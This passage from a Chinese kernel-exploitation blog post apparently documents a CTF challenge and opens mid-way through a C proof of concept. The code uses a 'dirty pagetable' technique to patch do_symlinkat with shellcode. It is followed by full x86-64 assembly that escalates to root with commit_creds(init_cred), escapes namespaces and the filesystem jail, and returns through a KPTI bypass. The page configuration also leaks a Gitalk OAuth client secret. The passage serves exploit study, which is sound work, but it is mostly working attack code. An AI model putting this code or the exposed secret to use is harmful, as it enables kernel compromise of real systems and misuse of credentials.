</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] DMA-BUF now points to PTE: 0x%016lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="kt">size_t</span><span class="o">*</span><span class="p">)</span><span class="n">dmabuf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">void</span> <span class="o">*</span><span class="n">wwwbuf</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="kt">size_t</span><span class="o">*</span><span class="p">)</span><span class="n">dmabuf</span> <span class="o">=</span> <span class="mh">0x800000000009c067</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">N_PAGESPRAY</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">page_spray</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="n">evil</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">size_t</span><span class="o">*</span><span class="p">)</span><span class="n">page_spray</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mh">0xffff</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">wwwbuf</span> <span class="o">=</span> <span class="n">page_spray</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] Found victim page table: %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">wwwbuf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span> <span class="n">phys_base</span> <span class="o">=</span> <span class="p">((</span><span class="o">*</span><span class="p">(</span><span class="kt">size_t</span><span class="o">*</span><span class="p">)</span><span class="n">wwwbuf</span><span class="p">)</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xfff</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x3a01000</span> <span class="o">-</span> <span class="mh">0x3000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] Physical kernel base address: 0x%016lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">phys_base</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">     <span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm">   * Overwrite setxattr
</span></span></span><span class="line"><span class="cl"><span class="cm">   */</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[+] Overwriting do_symlinkat...&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span> <span class="n">phys_func</span> <span class="o">=</span> <span class="n">phys_base</span> <span class="o">+</span> <span class="mh">0x42cc40</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="kt">size_t</span><span class="o">*</span><span class="p">)</span><span class="n">dmabuf</span> <span class="o">=</span> <span class="p">(</span><span class="n">phys_func</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xfff</span><span class="p">)</span> <span class="o">|</span> <span class="mh">0x8000000000000067</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="err">####</span><span class="n">SHELLCODE</span><span class="err">####</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//ffffffff81192eb0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//0x14011c6
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">void</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="nf">memmem</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="s">&#34;</span><span class="se">\x11\x11\x11\x11\x11\x11\x11\x11</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="kt">size_t</span><span class="o">*</span><span class="p">)</span><span class="n">p</span> <span class="o">=</span> <span class="nf">getpid</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="nf">memmem</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="s">&#34;</span><span class="se">\x22\x22\x22\x22\x22\x22\x22\x22</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="kt">size_t</span><span class="o">*</span><span class="p">)</span><span class="n">p</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">win</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="nf">memmem</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="s">&#34;</span><span class="se">\x33\x33\x33\x33\x33\x33\x33\x33</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="kt">size_t</span><span class="o">*</span><span class="p">)</span><span class="n">p</span> <span class="o">=</span> <span class="n">user_cs</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="nf">memmem</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="s">&#34;</span><span class="se">\x44\x44\x44\x44\x44\x44\x44\x44</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="kt">size_t</span><span class="o">*</span><span class="p">)</span><span class="n">p</span> <span class="o">=</span> <span class="n">user_rflags</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="nf">memmem</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="s">&#34;</span><span class="se">\x55\x55\x55\x55\x55\x55\x55\x55</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="kt">size_t</span><span class="o">*</span><span class="p">)</span><span class="n">p</span> <span class="o">=</span> <span class="n">user_sp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="nf">memmem</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="s">&#34;</span><span class="se">\x66\x66\x66\x66\x66\x66\x66\x66</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="kt">size_t</span><span class="o">*</span><span class="p">)</span><span class="n">p</span> <span class="o">=</span> <span class="n">user_ss</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">memcpy</span><span class="p">(</span><span class="n">wwwbuf</span> <span class="o">+</span> <span class="p">(</span><span class="n">phys_func</span> <span class="o">&amp;</span> <span class="mh">0xfff</span><span class="p">),</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[+] GO!GO!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">__pause</span><span class="p">(</span><span class="s">&#34;debug&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="nf">symlink</span><span class="p">(</span><span class="s">&#34;/jail/x&#34;</span><span class="p">,</span> <span class="s">&#34;/jail&#34;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="nf">__pause</span><span class="p">(</span><span class="s">&#34;debug&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="nf">poc</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="shellcodes">shellcode.s</h4>
<p>0x828需要根据调试来确定</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://nuc-1304629987.cos.ap-chongqing.myqcloud.com/image/image-20241110064137706.png"
        data-srcset="https://nuc-1304629987.cos.ap-chongqing.myqcloud.com/image/image-20241110064137706.png, https://nuc-1304629987.cos.ap-chongqing.myqcloud.com/image/image-20241110064137706.png 1.5x, https://nuc-1304629987.cos.ap-chongqing.myqcloud.com/image/image-20241110064137706.png 2x"
        data-sizes="auto"
        alt="https://nuc-1304629987.cos.ap-chongqing.myqcloud.com/image/image-20241110064137706.png"
        title="image-20241110064137706" /></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">init_cred         = 0x2a76b00
</span></span><span class="line"><span class="cl">commit_creds      = 0x1c2670
</span></span><span class="line"><span class="cl">find_task_by_vpid = 0x1b8fa0
</span></span><span class="line"><span class="cl">init_nsproxy      = 0x2a768c0
</span></span><span class="line"><span class="cl">switch_task_namespaces = 0x1c0ad0
</span></span><span class="line"><span class="cl">init_fs                = 0x2bb5320
</span></span><span class="line"><span class="cl">copy_fs_struct         = 0x45c0f0
</span></span><span class="line"><span class="cl">kpti_bypass            = 0x14011c6
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">_start:
</span></span><span class="line"><span class="cl">  endbr64
</span></span><span class="line"><span class="cl">  call a
</span></span><span class="line"><span class="cl">a:
</span></span><span class="line"><span class="cl">  pop r15
</span></span><span class="line"><span class="cl">  sub r15, 0x42cc49
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  lea rdi, [r15 + init_cred]
</span></span><span class="line"><span class="cl">  lea rax, [r15 + commit_creds]
</span></span><span class="line"><span class="cl">  call rax
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  mov edi, 1
</span></span><span class="line"><span class="cl">  lea rax, [r15 + find_task_by_vpid]
</span></span><span class="line"><span class="cl">  call rax
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  mov rdi, rax
</span></span><span class="line"><span class="cl">  lea rsi, [r15 + init_nsproxy]
</span></span><span class="line"><span class="cl">  lea rax, [r15 + switch_task_namespaces]
</span></span><span class="line"><span class="cl">  call rax
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  lea rdi, [r15 + init_fs]
</span></span><span class="line"><span class="cl">  lea rax, [r15 + copy_fs_struct]
</span></span><span class="line"><span class="cl">  call rax
</span></span><span class="line"><span class="cl">  mov rbx, rax
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  mov rdi, 0x1111111111111111
</span></span><span class="line"><span class="cl">  lea rax, [r15 + find_task_by_vpid]
</span></span><span class="line"><span class="cl">  call rax
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  mov [rax + 0x828], rbx
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  xor eax, eax
</span></span><span class="line"><span class="cl">  mov [rsp+0x00], rax
</span></span><span class="line"><span class="cl">  mov [rsp+0x08], rax
</span></span><span class="line"><span class="cl">  mov rax, 0x2222222222222222 
</span></span><span class="line"><span class="cl">  mov [rsp+0x10], rax
</span></span><span class="line"><span class="cl">  mov rax, 0x3333333333333333 
</span></span><span class="line"><span class="cl">  mov [rsp+0x18], rax
</span></span><span class="line"><span class="cl">  mov rax, 0x4444444444444444
</span></span><span class="line"><span class="cl">  mov [rsp+0x20], rax
</span></span><span class="line"><span class="cl">  mov rax, 0x5555555555555555
</span></span><span class="line"><span class="cl">  mov [rsp+0x28], rax
</span></span><span class="line"><span class="cl">  mov rax, 0x6666666666666666
</span></span><span class="line"><span class="cl">  mov [rsp+0x30], rax
</span></span><span class="line"><span class="cl">  lea rax, [r15 + kpti_bypass]
</span></span><span class="line"><span class="cl">  jmp rax
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  int3
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="realworld">realworld</h2>
<h3 id="cve-2023-1829">CVE-2023-1829</h3>
<h3 id="环境搭建">环境搭建</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget https://launchpad.net/ubuntu/+archive/primary/+sourcefiles/linux/5.15.0-25.25/linux_5.15.0.orig.tar.gz
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="漏洞原理分析">漏洞原理分析</h3>
<h4 id="patch文件分析">patch文件分析</h4>
<h3 id="poc">poc</h3>
<h3 id="参考链接">参考链接</h3>
<p><a href="https://starlabs.sg/blog/2023/06-breaking-the-code-exploiting-and-examining-cve-2023-1829-in-cls_tcindex-classifier-vulnerability/" target="_blank" rel="noopener noreffer ">Breaking the Code - Exploiting and Examining CVE-2023-1829 in cls_tcindex Classifier Vulnerability</a></p>
<h1 id="附录">附录</h1>
<p>punch hole可以达到和userfaultfd同等效果
可以提权（pop rdi;init_cred;commit_creds）以后通过vfork的方式顺利的返回用户态</p>
<h1 id="参考链接-1">参考链接</h1>
<p><a href="https://yanglingxi1993.github.io/dirty_pagetable/dirty_pagetable.html" target="_blank" rel="noopener noreffer ">dirty_pageable</a></p>
<p>[<a href="https://ptr-yudai.hatenablog.com/entry/2023/12/08/093606" target="_blank" rel="noopener noreffer ">Understanding Dirty Pagetable - m0leCon Finals 2023 CTF Writeup</a>]</p>
<p><a href="https://www.cnblogs.com/smilingsusu/articles/14541573.html" target="_blank" rel="noopener noreffer ">Linux 内核-如何获取虚拟地址对应的物理地址</a></p>
<p><a href="https://0x434b.dev/learning-linux-kernel-exploitation-part-2-cve-2022-0847/" target="_blank" rel="noopener noreffer ">cve-2022-0847-v2p</a></p></div><div id="comments"><div id="gitalk" class="comment"></div><noscript>
                Please enable JavaScript to view the comments powered by <a href="https://github.com/gitalk/gitalk"></a>Gitalk</a>.
            </noscript></div></div></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.110.0">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2021 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">cnitlrt</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.13.1/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/typeit@8.6.0/dist/index.umd.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/auto-render.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/copy-tex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"gitalk":{"admin":["cnitlrt"],"clientID":"2a776c3dc5f0100884f8","clientSecret":"b98d034dacc1331a3d9df7825119701a0a4b9533","id":"2023-11-09T09:15:58+08:00","owner":"cnitlrt","repo":"cnitlrt.github.io","title":"Kernel01"}},"data":{"id-1":"cnitlrtの博客","id-2":"cnitlrtの博客"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.zh-cn","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
